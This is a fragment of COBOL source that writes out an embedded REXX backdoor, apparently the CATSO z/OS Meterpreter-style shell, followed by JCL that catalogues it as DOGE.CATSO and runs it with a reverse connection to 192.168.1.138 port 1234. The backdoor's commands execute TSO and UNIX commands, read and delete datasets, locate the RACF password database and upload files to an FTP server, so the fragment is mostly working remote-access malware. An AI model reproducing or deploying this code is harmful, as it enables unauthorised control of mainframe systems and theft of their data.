     MOVE 'GET_RACFDB:' TO WS-LINE(406)
     MOVE '/* Gets the dataset (aka file) name of the RACF databas
-    'e */' TO WS-LINE(407)
     MOVE '/* This requires a TSO segment */' TO WS-LINE(408)
     MOVE '   x = OUTTRAP(''var.'')' TO WS-LINE(409)
     MOVE '   address tso "RVARY LIST"' TO WS-LINE(410)
     MOVE '   parse var var.4 active1 use1 num1 volume1 dataset1_s
-    'p' TO WS-LINE(411)
     MOVE '   parse var var.5 active2 use2 num2 volume2 dataset2_s
-    'p' TO WS-LINE(412)
     MOVE '   dataset1 = SPACE(dataset1_sp,0)' TO WS-LINE(413)
     MOVE '   dataset2 = SPACE(dataset2_sp,0)' TO WS-LINE(414)
     MOVE '   if use1 = ''PRIM'' then' TO WS-LINE(415)
     MOVE '     text = NEWLINE||"Primary"||NEWLINE||"========"||NE
-    'WLINE' TO WS-LINE(416)
     MOVE '   else' TO WS-LINE(417)
     MOVE '     text = NEWLINE||"Backup"||NEWLINE||"========"||NEW
-    'LINE' TO WS-LINE(418)
     MOVE ' ' TO WS-LINE(419)
     MOVE '     text = text||" Active    : "||active1||NEWLINE,'
-     TO WS-LINE(420)
     MOVE '            "FileName  : "||dataset1||NEWLINE||NEWLINE'
-     TO WS-LINE(421)
     MOVE '   if use2 = ''PRIM'' then' TO WS-LINE(422)
     MOVE '     text = text||"Primary"||NEWLINE||"========"||NEWLI
-    'NE' TO WS-LINE(423)
     MOVE '   else' TO WS-LINE(424)
     MOVE '     text = text||"Backup"||NEWLINE||"========"||NEWLIN
-    'E' TO WS-LINE(425)
     MOVE ' ' TO WS-LINE(426)
     MOVE '     text = text||" Active    : "||active2||NEWLINE,'
-     TO WS-LINE(427)
     MOVE '                  "Filename  : "||dataset2||NEWLINE'
-     TO WS-LINE(428)
     MOVE '   x = OUTTRAP(OFF)' TO WS-LINE(429)
     MOVE '   return text' TO WS-LINE(430)
     MOVE ' ' TO WS-LINE(431)
     MOVE 'UNIX_COMMAND:' TO WS-LINE(432)
     MOVE '/* Executes a UNIX command (aka OMVS) */'
-     TO WS-LINE(433)
     MOVE '    parse arg unix_command' TO WS-LINE(434)
     MOVE '    CALL BPXWUNIX unix_command,,out.' TO WS-LINE(435)
     MOVE '    text = ''''||NEWLINE /* blank out text */'
-     TO WS-LINE(436)
     MOVE '    DO i = 1 TO out.0' TO WS-LINE(437)
     MOVE '       text = text||out.i||NEWLINE' TO WS-LINE(438)
     MOVE '    END' TO WS-LINE(439)
     MOVE '  return text' TO WS-LINE(440)
     MOVE ' ' TO WS-LINE(441)
     MOVE 'TSO_COMMAND:' TO WS-LINE(442)
     MOVE '/* outputs the results of a TSO command */'
-     TO WS-LINE(443)
     MOVE '   parse arg tso_do' TO WS-LINE(444)
     MOVE '   text = NEWLINE||"Issuing TSO Command: "||tso_do||NEW
-    'LINE' TO WS-LINE(445)
     MOVE '   u = OUTTRAP(''tso_out.'')' TO WS-LINE(446)
     MOVE '   ADDRESS TSO tso_do' TO WS-LINE(447)
     MOVE '   u = OUTTRAP(OFF)' TO WS-LINE(448)
     MOVE '   DO i = 1 to tso_out.0' TO WS-LINE(449)
     MOVE '      text = text||tso_out.i||NEWLINE' TO WS-LINE(450)
     MOVE '   END' TO WS-LINE(451)
     MOVE ' return text' TO WS-LINE(452)
     MOVE ' ' TO WS-LINE(453)
     MOVE 'GET_OS_INFO:' TO WS-LINE(454)
     MOVE '/* z/OS Operating System Information */'
-     TO WS-LINE(455)
     MOVE '/* Lots of help from the LPINFO script from */'
-     TO WS-LINE(456)
     MOVE '/* www.longpelaexpertise.com.au */' TO WS-LINE(457)
     MOVE '   cvtaddr = get_dec_addr(16)' TO WS-LINE(458)
     MOVE '   zos_name = Strip(Storage(D2x(cvtaddr+340),8))'
-     TO WS-LINE(459)
     MOVE '   ecvtaddr = get_dec_addr(cvtaddr+140)'
-     TO WS-LINE(460)
     MOVE '   zos_ver = Strip(Storage(D2x(ecvtaddr+512),2))'
-     TO WS-LINE(461)
     MOVE '   zos_rel = Strip(Storage(D2x(ecvtaddr+514),2))'
-     TO WS-LINE(462)
     MOVE '   sysplex = Strip(Storage(D2x(ecvtaddr+8),8))'
-     TO WS-LINE(463)
     MOVE '   jes_p = SYSVAR(''SYSJES'')' TO WS-LINE(464)
     MOVE '   parse var jes_p jes .' TO WS-LINE(465)
     MOVE '   jes_node = jes||'' (Node: ''|| SYSVAR(''SYSNODE'')||
-    ''')''' TO WS-LINE(466)
     MOVE '   security_node = get_security_system(cvtaddr+992)'
-     TO WS-LINE(467)
     MOVE '   text = NEWLINE,' TO WS-LINE(468)
     MOVE '       "Computer    : LPAR "|| zos_name||NEWLINE,'
-     TO WS-LINE(469)
     MOVE '       "Sysplex     : "||sysplex||NEWLINE,'
-     TO WS-LINE(470)
     MOVE '       "OS          : z/OS" zos_ver||.||zos_rel||NEWLIN
-    'E,' TO WS-LINE(471)
     MOVE '       "Job Entry   : "||jes_node||NEWLINE,'
-     TO WS-LINE(472)
     MOVE '       "Security    : "||security_node||NEWLINE,'
-     TO WS-LINE(473)
     MOVE '       "Meterpreter : z/OS REXX"||NEWLINE'
-     TO WS-LINE(474)
     MOVE '   return text' TO WS-LINE(475)
     MOVE ' ' TO WS-LINE(476)
     MOVE 'get_dec_addr: /* Needed for GET_OS_INFO */'
-     TO WS-LINE(477)
     MOVE '     parse arg addr' TO WS-LINE(478)
     MOVE '     hex_addr = d2x(addr)' TO WS-LINE(479)
     MOVE '     stor = Storage(hex_addr,4)' TO WS-LINE(480)
     MOVE '     hex_stor = c2x(stor)' TO WS-LINE(481)
     MOVE '     value = x2d(hex_stor)' TO WS-LINE(482)
     MOVE '  return value' TO WS-LINE(483)
     MOVE 'get_security_system:  /* needed for GET_OS_INFO */'
-     TO WS-LINE(484)
     MOVE '     parse arg sec_addr' TO WS-LINE(485)
     MOVE '     cvtrac = get_dec_addr(sec_addr)' TO WS-LINE(486)
     MOVE '     rcvtid = Storage(d2x(cvtrac),4)' TO WS-LINE(487)
     MOVE '     if rcvtid = ''RCVT'' then return ''RACF'''
-     TO WS-LINE(488)
     MOVE '     if rcvtid = ''RTSS'' then return ''CA Top Secret''
-    '' TO WS-LINE(489)
     MOVE '     if rcvtid = ''ACF2'' then return ''CA ACF2'''
-     TO WS-LINE(490)
     MOVE '   return 0' TO WS-LINE(491)
     MOVE ' ' TO WS-LINE(492)
     MOVE 'CAT_FILE:' TO WS-LINE(493)
     MOVE '/* Cats a file and returns it to the screen */'
-     TO WS-LINE(494)
     MOVE '  parse arg meow .' TO WS-LINE(495)
     MOVE '  cat = STRIP(meow)' TO WS-LINE(496)
     MOVE '  ADDRESS TSO "ALLOC F(intemp) DSN(''"||cat||"'') SHR"'
-     TO WS-LINE(497)
     MOVE '  ADDRESS TSO "EXECIO * DISKR intemp (FINIS STEM TIGER.
-    '"' TO WS-LINE(498)
     MOVE '  ADDRESS TSO "free file(intemp)"' TO WS-LINE(499)
     MOVE '  text = NEWLINE||''File: ''||meow||NEWLINE'
-     TO WS-LINE(500)
     MOVE '  text = text||''File Length: ''||TIGER.0||NEWLINE'
-     TO WS-LINE(501)
     MOVE '  DO i = 1 TO TIGER.0' TO WS-LINE(502)
     MOVE '      text = text||TIGER.i||NEWLINE' TO WS-LINE(503)
     MOVE ' ' TO WS-LINE(504)
     MOVE '  END' TO WS-LINE(505)
     MOVE ' return text' TO WS-LINE(506)
     MOVE ' ' TO WS-LINE(507)
     MOVE 'CP: /* Uses a JCL to copy one file to the other */'
-     TO WS-LINE(508)
     MOVE '    parse arg from_DS to_DS' TO WS-LINE(509)
     MOVE '    IF to_DS = '''' THEN' TO WS-LINE(510)
     MOVE '    DO' TO WS-LINE(511)
     MOVE '      text = NEWLINE||"cp command requires a to and a f
-    'rom.",' TO WS-LINE(512)
     MOVE '             "You only supplied: "||from_DS||NEWLINE'
-     TO WS-LINE(513)
     MOVE '      return text' TO WS-LINE(514)
     MOVE '    END' TO WS-LINE(515)
     MOVE '    DROPBUF 0' TO WS-LINE(516)
     MOVE '    queue "//CPTHATS EXEC PGM=IEBGENER"'
-     TO WS-LINE(517)
     MOVE '    queue "//SYSPRINT DD SYSOUT=*"' TO WS-LINE(518)
     MOVE '    queue "//SYSIN    DD DUMMY"' TO WS-LINE(519)
     MOVE '    queue "//SYSUT1   DD DSN="||from_DS||",DISP=SHR"'
-     TO WS-LINE(520)
     MOVE '    queue "//SYSUT2   DD DSN="||to_DS||","'
-     TO WS-LINE(521)
     MOVE '    queue "//     LIKE="||from_DS||","' TO WS-LINE(522)
     MOVE '    queue "//     DISP=(NEW,CATLG,DELETE),"'
-     TO WS-LINE(523)
     MOVE '    queue "//     UNIT=SYSDA"' TO WS-LINE(524)
     MOVE '    queue "/*"' TO WS-LINE(525)
     MOVE '    queue "@#"' TO WS-LINE(526)
     MOVE '    v = OUTTRAP(''sub.'')' TO WS-LINE(527)
     MOVE '    ADDRESS TSO "SUB * END(@#)"' TO WS-LINE(528)
     MOVE '    v = OUTTRAP(OFF)' TO WS-LINE(529)
     MOVE '  text = NEWLINE||"File "||from_DS||" copying to "||to_
-    'DS||NEWLINE' TO WS-LINE(530)
     MOVE '  return text' TO WS-LINE(531)
     MOVE ' ' TO WS-LINE(532)
     MOVE 'DELETE:' TO WS-LINE(533)
     MOVE '    /* Deletes a file or dataset member */'
-     TO WS-LINE(534)
     MOVE '    parse arg deleteme .' TO WS-LINE(535)
     MOVE '    IF deleteme = '''' THEN' TO WS-LINE(536)
     MOVE '    DO' TO WS-LINE(537)
     MOVE '      text = NEWLINE||"You didn''t supply a dataset to 
-    'delete"' TO WS-LINE(538)
     MOVE '      return text' TO WS-LINE(539)
     MOVE '    END' TO WS-LINE(540)
     MOVE '    d = OUTTRAP(''tdel.'')' TO WS-LINE(541)
     MOVE '    ADDRESS TSO "DELETE ''"||deleteme||"''"'
-     TO WS-LINE(542)
     MOVE '    /* if you don''t put '''' around a dataset it prepe
-    'nds your userid */' TO WS-LINE(543)
     MOVE '    d = OUTTRAP(OFF)' TO WS-LINE(544)
     MOVE '    text = NEWLINE' TO WS-LINE(545)
     MOVE '    DO i = 1 to tdel.0' TO WS-LINE(546)
     MOVE '      text = text||NEWLINE||tdel.i' TO WS-LINE(547)
     MOVE '    END' TO WS-LINE(548)
     MOVE '  return text' TO WS-LINE(549)
     MOVE ' ' TO WS-LINE(550)
     MOVE 'UPLOAD_FILE:' TO WS-LINE(551)
     MOVE '/* Uploads a file from the mainframe to an FTP server *
-    '/' TO WS-LINE(552)
     MOVE '/* It submits a JOB which uploads the file */'
-     TO WS-LINE(553)
     MOVE '/* FYI this doesn''t always work with a debian FTP serv
-    'er */' TO WS-LINE(554)
     MOVE '    parse arg ftp_server username password dataset bina
-    'ry .' TO WS-LINE(555)
     MOVE '    DROPBUF 0 /* clear the buffer */' TO WS-LINE(556)
     MOVE '    queue "//FTP      EXEC PGM=FTP,"' TO WS-LINE(557)
     MOVE '    queue "//         PARM=''"||ftp_server||" (EXIT'' "
-    '' TO WS-LINE(558)
     MOVE '    queue "//SYSMDUMP DD   SYSOUT=* "' TO WS-LINE(559)
     MOVE '    queue "//SYSPRINT DD   SYSOUT=* "' TO WS-LINE(560)
     MOVE '    queue "//INPUT DD * "' TO WS-LINE(561)
     MOVE '    queue username' TO WS-LINE(562)
     MOVE '    queue password' TO WS-LINE(563)
     MOVE '    if binary = "binary" then queue put "binary"'
-     TO WS-LINE(564)
     MOVE '    queue "put ''"||dataset||"''"' TO WS-LINE(565)
     MOVE '    queue "quit "' TO WS-LINE(566)
     MOVE '    queue "/*"' TO WS-LINE(567)
     MOVE '    queue "@#"' TO WS-LINE(568)
     MOVE '    ADDRESS TSO "SUB * END(@#)"' TO WS-LINE(569)
     MOVE '    text = NEWLINE||"Uploading file "||dataset||" to "|
-    '|ftp_server,' TO WS-LINE(570)
     MOVE '           "using user name"||username||"."'
-     TO WS-LINE(571)
     MOVE '    if binary = "binary" then' TO WS-LINE(572)
     MOVE '        text = text||" Using Binary transfer mode."'
-     TO WS-LINE(573)
     MOVE '    else' TO WS-LINE(574)
     MOVE '        text = text||" Not using Binary transfer mode."
-    '' TO WS-LINE(575)
     MOVE '  return text' TO WS-LINE(576)
     MOVE ' ' TO WS-LINE(577)
     MOVE 'LS:' TO WS-LINE(578)
     MOVE '/* Lists datasets given a high level qualifier (hlq) */
-    '' TO WS-LINE(579)
     MOVE '    parse arg suckit, hilevel .' TO WS-LINE(580)
     MOVE '    filez = STRIP(hilevel)' TO WS-LINE(581)
     MOVE '    IF filez = '''' then filez = USERID()'
-     TO WS-LINE(582)
     MOVE '    hedr = NEWLINE||" Listing Files: " filez||".*"||NEW
-    'LINE,' TO WS-LINE(583)
     MOVE '           "========================================="|
-    '|NEWLINE' TO WS-LINE(584)
     MOVE '    terp = SOCKET(''SEND'',suckit, hedr)'
-     TO WS-LINE(585)
     MOVE '    text = NEWLINE' TO WS-LINE(586)
     MOVE '    b = OUTTRAP(''ls_cmd.'')' TO WS-LINE(587)
     MOVE '    ADDRESS TSO "LISTC LEVEL("||filez||")"'
-     TO WS-LINE(588)
     MOVE '    b = OUTTRAP(OFF)' TO WS-LINE(589)
     MOVE '    filed = 1' TO WS-LINE(590)
     MOVE '    DO i = 1 to ls_cmd.0' TO WS-LINE(591)
     MOVE '       IF filed THEN' TO WS-LINE(592)
     MOVE '        DO' TO WS-LINE(593)
     MOVE '          text = text||ls_cmd.i||NEWLINE'
-     TO WS-LINE(594)
     MOVE '          filed = 0' TO WS-LINE(595)
     MOVE '        END' TO WS-LINE(596)
     MOVE '       ELSE' TO WS-LINE(597)
     MOVE '          filed = 1' TO WS-LINE(598)
     MOVE '    END' TO WS-LINE(599)
     MOVE ' ' TO WS-LINE(600)
     MOVE '  return text' TO WS-LINE(601)
     MOVE ' ' TO WS-LINE(602)
     MOVE 'LS_MEMBERS:' TO WS-LINE(603)
     MOVE '/* Lists datasets given a ''high level qualifier, or HL
-    'Q */' TO WS-LINE(604)
     MOVE '    parse arg hilevelmem .' TO WS-LINE(605)
     MOVE '    text = NEWLINE' TO WS-LINE(606)
     MOVE '    x = OUTTRAP(''members.'')' TO WS-LINE(607)
     MOVE '    ADDRESS TSO "LISTDS ''"||hilevelmem||"'' members"'
-     TO WS-LINE(608)
     MOVE '    x = OUTTRAP(OFF)' TO WS-LINE(609)
     MOVE '    DO i = 7 TO members.0' TO WS-LINE(610)
     MOVE '       members.i = STRIP(members.i)' TO WS-LINE(611)
     MOVE '       text = text||''--> ''||hilevelmem||"("||members.
-    'i||")"||NEWLINE' TO WS-LINE(612)
     MOVE '    END' TO WS-LINE(613)
     MOVE '  return text' TO WS-LINE(614)
     MOVE ' ' TO WS-LINE(615)
     MOVE 'UPPER:' TO WS-LINE(616)
     MOVE '/* Of all the built-in functions, this isn''t one of th
-    'em */' TO WS-LINE(617)
     MOVE '    PARSE UPPER ARG STRINGED' TO WS-LINE(618)
     MOVE '    return STRINGED' TO WS-LINE(619)
     MOVE ' ' TO WS-LINE(620)
     MOVE 'GET_HELP:' TO WS-LINE(621)
     MOVE '/* Help command */' TO WS-LINE(622)
     MOVE '       help = NEWLINE,' TO WS-LINE(623)
     MOVE '       "Core Commands"||NEWLINE,' TO WS-LINE(624)
     MOVE '       "============="||NEWLINE||NEWLINE,'
-     TO WS-LINE(625)
     MOVE '       "  Command           Description"||NEWLINE,'
-     TO WS-LINE(626)
     MOVE '       "  -------           -----------"||NEWLINE,'
-     TO WS-LINE(627)
     MOVE '       "  help              Help Menu"||NEWLINE,'
-     TO WS-LINE(628)
     MOVE '       "  exit              Terminate the session"||NEW
-    'LINE,' TO WS-LINE(629)
     MOVE '       "  quit              Terminate the session"||NEW
-    'LINE,' TO WS-LINE(630)
     MOVE '       NEWLINE||NEWLINE,' TO WS-LINE(631)
     MOVE '       "Filesystem Commands"||NEWLINE,' TO WS-LINE(632)
     MOVE '       "==================="||NEWLINE||NEWLINE,'
-     TO WS-LINE(633)
     MOVE '       "  Command           Description"||NEWLINE,'
-     TO WS-LINE(634)
     MOVE '       "  -------           -----------"||NEWLINE,'
-     TO WS-LINE(635)
     MOVE '       "  cat               Show contents of dataset"||
-    'NEWLINE,' TO WS-LINE(636)
     MOVE '       "  cp                copies a file to a new file
-    '"||NEWLINE,' TO WS-LINE(637)
     MOVE '       "  ls                list datasets in HLQ"||NEWL
-    'INE,' TO WS-LINE(638)
     MOVE '       "  delete            deletes a file"||NEWLINE,'
-     TO WS-LINE(639)
     MOVE '       "  del               also deletes a file"||NEWLI
-    'NE,' TO WS-LINE(640)
     MOVE '       "  lsmem             Lists files and members"||N
-    'EWLINE,' TO WS-LINE(641)
     MOVE '       "                    !!WARNING!! Takes time and 
-    'IO"||NEWLINE,' TO WS-LINE(642)
     MOVE '       NEWLINE||NEWLINE,' TO WS-LINE(643)
     MOVE '       "Networking Commands"||NEWLINE,' TO WS-LINE(644)
     MOVE '       "==================="||NEWLINE||NEWLINE,'
-     TO WS-LINE(645)
     MOVE '       "  Command           Description"||NEWLINE,'
-     TO WS-LINE(646)
     MOVE '       "  -------           -----------"||NEWLINE,'
-     TO WS-LINE(647)
     MOVE '       "  ipconfig          Display interfaces"||NEWLIN
-    'E,' TO WS-LINE(648)
     MOVE '       "  ifconfig          Display interfaces"||NEWLIN
-    'E,' TO WS-LINE(649)
     MOVE '       NEWLINE||NEWLINE,' TO WS-LINE(650)
     MOVE '       "System Commands"||NEWLINE,' TO WS-LINE(651)
     MOVE '       "==============="||NEWLINE||NEWLINE,'
-     TO WS-LINE(652)
     MOVE '       "  Command           Description"||NEWLINE,'
-     TO WS-LINE(653)
     MOVE '       "  -------           -----------"||NEWLINE,'
-     TO WS-LINE(654)
     MOVE '       "  getuid            Get current user name"||NEW
-    'LINE,' TO WS-LINE(655)
     MOVE '       "  sysinfo           Remote system info (i.e OS)
-    '"||NEWLINE,' TO WS-LINE(656)
     MOVE '       "  racf              Show password database loca
-    'tion",' TO WS-LINE(657)
     MOVE '       NEWLINE,' TO WS-LINE(658)
     MOVE '       "  execute           Execute a TSO command"||NEW
-    'LINE,' TO WS-LINE(659)
     MOVE '       "  tso               Execute TSO command (same a
-    's execute)",' TO WS-LINE(660)
     MOVE '       NEWLINE,' TO WS-LINE(661)
     MOVE '       "  unix              UNIX command (i.e ls -al)"|
-    '|NEWLINE,' TO WS-LINE(662)
     MOVE '       "  ftp               Upload a file from the main
-    'frame to",' TO WS-LINE(663)
     MOVE '       NEWLINE,' TO WS-LINE(664)
     MOVE '       "                    an FTP server. Syntax is:"|
-    '|NEWLINE,' TO WS-LINE(665)
     MOVE '       "                    host/ip user pass filename 
-    '[binary]",' TO WS-LINE(666)
     MOVE '       NEWLINE||NEWLINE' TO WS-LINE(667)
     MOVE '     return help' TO WS-LINE(668)
     MOVE '/XX' TO WS-LINE(669)
     MOVE '//SYSUT2   DD DISP=(NEW,CATLG,DELETE),DSN=DOGE.CATSO,'
-     TO WS-LINE(670)
     MOVE '//         SPACE=(CYL,10)' TO WS-LINE(671)
     MOVE '//RUNCAT  EXEC PGM=IKJEFT01' TO WS-LINE(672)
     MOVE '//SYSTSIN  DD *' TO WS-LINE(673)
     MOVE '  EXEC ''DOGE.CATSO'' ''R 192.168.1.138 1234'''
-     TO WS-LINE(674)
     MOVE '/*' TO WS-LINE(675)
     MOVE '//SYSIN    DD DUMMY' TO WS-LINE(676)
     MOVE '//SYSTSPRT DD SYSOUT=*' TO WS-LINE(677)
